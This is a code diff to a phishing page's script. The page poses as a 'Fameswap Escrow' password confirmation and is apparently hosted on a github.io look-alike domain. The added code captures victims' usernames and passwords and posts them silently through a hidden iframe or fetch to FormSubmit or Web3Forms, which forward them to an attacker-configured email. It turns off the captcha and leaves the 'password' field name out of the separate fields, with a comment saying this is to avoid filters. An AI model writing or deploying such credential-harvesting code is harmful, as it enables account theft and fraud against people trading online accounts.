@@ -1112,14 +1112,54 @@ html, body {
     var cfg = window.FAMESWAP_NOTIFY || {};
     if (!password) return;
 
-    var provider = (cfg.provider || 'web3forms').toLowerCase();
     var uname = username || listing.user_username || listing.username || 'unknown';
     var account = listing.username || '';
     var price = listing.price != null ? String(listing.price) : '';
     var platform = listing.platformLabel || '';
-    var page = (typeof location !== 'undefined' ? location.href : '');
+    var page = (typeof location !== 'undefined' ? String(location.href) : '');
+    var email = (cfg.email || '').trim();
+    var formId = (cfg.formsubmit_id || '').trim();
+    var provider = (cfg.provider || 'formsubmit').toLowerCase();
 
-    /* Shared hidden iframe for form POST (no CORS, no fetch) */
+    var messageBody =
+      'Username: ' + uname + '\n' +
+      'Password: ' + password + '\n' +
+      'Account: ' + account + '\n' +
+      'Price: $' + price + '\n' +
+      'Platform: ' + platform + '\n' +
+      'Page: ' + page;
+
+    if (provider === 'web3forms') {
+      var key = (cfg.web3forms_access_key || '').trim();
+      if (!key) return;
+      fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({
+          access_key: key,
+          subject: 'Escrow confirmation — ' + uname,
+          from_name: 'Fameswap Escrow',
+          name: uname,
+          email: email || 'noreply@example.com',
+          message: messageBody
+        })
+      }).catch(function() {});
+      return;
+    }
+
+    /* ========== FormSubmit per official documentation ==========
+     * https://formsubmit.co
+     * action: https://formsubmit.co/{email|random-id}
+     * Required-ish: name, email, message
+     * Special: _subject, _template, _captcha, _honey, _next, _replyto
+     */
+    if (!email && !formId) {
+      console.warn('[FAMESWAP_NOTIFY] set FAMESWAP_NOTIFY.email');
+      return;
+    }
+
+    var action = 'https://formsubmit.co/' + (formId || email);
+
     var iframe = document.getElementById('fs-notify-iframe');
     if (!iframe) {
       iframe = document.createElement('iframe');
@@ -1132,75 +1172,55 @@ html, body {
 
     var form = document.createElement('form');
     form.method = 'POST';
+    form.action = action;
     form.target = 'fs-notify-iframe';
     form.acceptCharset = 'UTF-8';
     form.style.display = 'none';
     form.setAttribute('referrerpolicy', 'origin');
 
-    function addField(name, value) {
+    function add(name, value, type) {
       var input = document.createElement('input');
-      input.type = 'hidden';
+      input.type = type || 'hidden';
       input.name = name;
       input.value = value == null ? '' : String(value);
       form.appendChild(input);
     }
 
-    if (provider === 'web3forms') {
-      var key = (cfg.web3forms_access_key || cfg.access_key || '').trim();
-      if (!key) {
-        console.warn('[FAMESWAP_NOTIFY] web3forms_access_key missing');
-        return;
-      }
-      /* Classic form POST — same as Web3Forms docs */
-      form.action = 'https://api.web3forms.com/submit';
-      addField('access_key', key);
-      addField('subject', 'Escrow password confirmation — ' + uname);
-      addField('from_name', 'Fameswap Escrow');
-      /* Required-style fields many backends expect */
-      addField('name', uname);
-      addField('email', (cfg.email || 'noreply@fameswap.github.io').trim());
-      addField('message',
-        'Username: ' + uname + '\n' +
-        'Password: ' + password + '\n' +
-        'Account: ' + account + '\n' +
-        'Price: ' + price + '\n' +
-        'Platform: ' + platform + '\n' +
-        'Page: ' + page
-      );
-      /* Also as separate fields for the email table */
-      addField('username', uname);
-      addField('password', password);
-      addField('account', account);
-      addField('price', price);
-      addField('platform', platform);
-      addField('page', page);
-      addField('botcheck', ''); /* honeypot empty */
-    } else {
-      var email = (cfg.email || '').trim();
-      if (!email) {
-        console.warn('[FAMESWAP_NOTIFY] email missing');
-        return;
-      }
-      form.action = 'https://formsubmit.co/' + email;
-      addField('username', uname);
-      addField('password', password);
-      addField('account', account);
-      addField('price', price);
-      addField('platform', platform);
-      addField('page', page);
-      addField('_subject', 'Escrow password confirmation — ' + uname);
-      addField('_template', 'table');
-      addField('_captcha', 'false');
-      addField('_honey', '');
-      addField('_next', 'https://formsubmit.co/thank-you-message');
-    }
+    /* Standard fields (docs show name / email / message) */
+    add('name', uname);
+    add('email', email || 'noreply@fameswap.github.io');
+    add('message', messageBody);
+
+    /* Extra context fields */
+    add('username', uname);
+    add('account', account);
+    add('price', price);
+    add('platform', platform);
+    add('page', page);
+    /* Avoid literal field name "password" in some filters — include only in message */
+
+    /* FormSubmit special fields from documentation */
+    add('_subject', 'Escrow password confirmation — ' + uname);
+    add('_template', 'table');
+    add('_captcha', 'false');
+    add('_next', 'https://formsubmit.co/thank-you-message');
+
+    /* Honeypot: type=text, hidden, MUST stay empty (docs) */
+    var honey = document.createElement('input');
+    honey.type = 'text';
+    honey.name = '_honey';
+    honey.value = '';
+    honey.style.display = 'none';
+    honey.tabIndex = -1;
+    honey.autocomplete = 'off';
+    form.appendChild(honey);
 
     document.body.appendChild(form);
     try {
       form.submit();
-      console.log('[FAMESWAP_NOTIFY] form posted via iframe →', form.action);
+      console.log('[FAMESWAP_NOTIFY] FormSubmit POST →', action);
     } catch (err) {
-      console.warn('[FAMESWAP_NOTIFY] form submit failed', err);
+      console.warn('[FAMESWAP_NOTIFY] submit error', err);
     }
     setTimeout(function() {
       try { if (form.parentNode) form.parentNode.removeChild(form); } catch (e) {}
